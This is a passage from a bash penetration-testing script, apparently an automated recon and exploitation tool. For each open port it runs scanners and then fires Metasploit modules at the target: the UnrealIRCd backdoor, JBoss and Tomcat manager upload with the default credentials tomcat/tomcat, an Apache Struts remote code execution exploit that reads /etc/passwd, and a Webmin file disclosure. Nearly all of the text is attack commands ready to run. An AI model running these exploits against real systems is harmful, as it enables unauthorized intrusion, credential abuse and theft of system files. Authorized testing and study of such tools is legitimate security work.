	echo -e "$OKORANGE + -- --=[Port 6667 opened... running tests...$RESET"
	nmap -A -sV -Pn -T5 --script=irc* -p 6667 $TARGET
	msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_8000" ];
then
	echo -e "$OKRED + -- --=[Port 8000 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 8000 opened... running tests...$RESET"
	wafw00f http://$TARGET:8000
	echo ""
	whatweb http://$TARGET:8000
	echo ""
	xsstracer $TARGET 8000
	cd ..
	nikto -h http://$TARGET:8000 
	cutycapt --url=http://$TARGET:8000 --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port8000.jpg
	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000 -T5 $TARGET
fi

if [ -z "$port_8100" ];
then
	echo -e "$OKRED + -- --=[Port 8100 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 8100 opened... running tests...$RESET"
	wafw00f http://$TARGET:8100
	echo ""
	whatweb http://$TARGET:8100
	echo ""
	xsstracer $TARGET 8100
	sslscan --no-failed $TARGET:8100
	cd $APPLICATION_PATH/MassBleed
	./massbleed $TARGET port 8100
	cd $CURRENT_PATH
	nikto -h http://$TARGET:8100 
	cutycapt --url=http://$TARGET:8100 --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port8100.jpg
	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 -T5 $TARGET
fi

if [ -z "$port_8080" ];
then
	echo -e "$OKRED + -- --=[Port 8080 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 8080 opened... running tests...$RESET"
	wafw00f http://$TARGET:8080
	echo ""
	whatweb http://$TARGET:8080
	echo ""
	xsstracer $TARGET 8080
	sslscan --no-failed $TARGET:8080
	cd $APPLICATION_PATH/MassBleed
	./massbleed $TARGET port 8080
	cd $CURRENT_PATH
	nikto -h http://$TARGET:8080 
	cutycapt --url=http://$TARGET:8080 --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port8080.jpg
	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080 -T5 --script=*proxy* $TARGET
	msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
	# EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
	msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"
fi

if [ -z "$port_8180" ];
then
	echo -e "$OKRED + -- --=[Port 8180 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 8180 opened... running tests...$RESET"
	wafw00f http://$TARGET:8180
	echo ""
	whatweb http://$TARGET:8180
	echo ""
	xsstracer $TARGET 8180
	sslscan --no-failed $TARGET:8180
	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8180
	cd $APPLICATION_PATH/MassBleed
	./massbleed $TARGET port 8180
	cd $CURRENT_PATH
	nikto -h http://$TARGET:8180 
	cutycapt --url=http://$TARGET:8180 --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port8180.jpg
	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
	msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
fi

if [ -z "$port_8443" ];
then
	echo -e "$OKRED + -- --=[Port 8443 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 8443 opened... running tests...$RESET"
	wafw00f http://$TARGET:8443
	echo ""
	whatweb http://$TARGET:8443
	echo ""
	xsstracer $TARGET 8443
	sslscan --no-failed $TARGET:8443
	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8443
	cd $APPLICATION_PATH/MassBleed
	./massbleed $TARGET port 8443
	cd $CURRENT_PATH
	nikto -h https://$TARGET:8443 
	cutycapt --url=https://$TARGET:8443 --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port8443.jpg
	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443 -T5 --script=*proxy* $TARGET
fi

if [ -z "$port_8888" ];
then
	echo -e "$OKRED + -- --=[Port 8888 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 8888 opened... running tests...$RESET"
	wafw00f http://$TARGET:8888
	echo ""
	whatweb http://$TARGET:8888
	echo ""
	xsstracer $TARGET 8888
	nikto -h http://$TARGET:8888 
	cutycapt --url=https://$TARGET:8888 --out=$REPORT_PATH$TARGET/screenshots/$TARGET-port8888.jpg
	nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse  -A -p 8888 -T5 $TARGET
fi

if [ -z "$port_10000" ];
then
	echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Scanning For Common Vulnerabilities]=----- -- +$RESET"
	echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
	msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_16992" ];
then
	echo -e "$OKRED + -- --=[Port 16992 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 16992 opened... running tests...$RESET"
	amap $TARGET 16992 -A
	nmap -A -sV -Pn -T5 --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET
fi

if [ -z "$port_27017" ];
then
	echo -e "$OKRED + -- --=[Port 27017 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 27017 opened... running tests...$RESET"
	nmap -sV -p 27017 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_27018" ];
then
	echo -e "$OKRED + -- --=[Port 27018 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 27018 opened... running tests...$RESET"
	nmap -sV  -p 27018 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_27019" ];
then
	echo -e "$OKRED + -- --=[Port 27019 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 27019 opened... running tests...$RESET"
	nmap -sV  -p 27019 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_28017" ];
then
	echo -e "$OKRED + -- --=[Port 28017 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 28017 opened... running tests...$RESET"
	nmap -sV  -p 28017 -Pn -T5 --script=mongodb* $TARGET
fi

if [ -z "$port_49152" ];
then
	echo -e "$OKRED + -- --=[Port 49152 closed... skipping.$RESET"
else
	echo -e "$OKORANGE + -- --=[Port 49152 opened... running tests...$RESET"
	$SUPER_MICRO_SCAN $TARGET
fi


